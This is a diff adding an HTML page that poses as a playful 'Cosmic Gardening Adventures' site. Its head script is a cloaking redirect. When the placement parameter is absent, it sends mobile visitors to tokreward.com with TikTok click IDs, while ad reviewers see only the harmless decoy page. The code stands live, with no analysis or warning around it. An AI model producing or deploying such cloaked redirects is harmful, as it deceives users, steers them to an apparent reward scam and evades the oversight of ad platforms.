@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://tokreward.com/api/v5/entry?s1=${s}&ttclid=${ttclid}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Gardening Adventures</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: rgba(0, 0, 0, 0.7);
+            color: #fff;
+            text-align: center;
+            padding: 20px;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+            flex-grow: 1;
+        }
+        .card {
+            background-color: rgba(255, 255, 255, 0.8);
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            transform: rotate(3deg);
+        }
+        footer {
+            background-color: rgba(0, 0, 0, 0.7);
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+        }
+        a {
+            color: #ff00ff;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Gardening Adventures</h1>
+    </header>
+    <main>
+        <div class="card">
+            <h2>Martian Tomatoes</h2>
+            <p>Grow the juiciest tomatoes in the galaxy!</p>
+        </div>
+        <div class="card">
+            <h2>Lunar Lavender</h2>
+            <p>Fragrant flowers that bloom in zero gravity!</p>
+        </div>
+        <div class="card">
+            <h2>Asteroid Aloe</h2>
+            <p>Succulent plants perfect for space station decor!</p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Cosmic Gardening Adventures | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
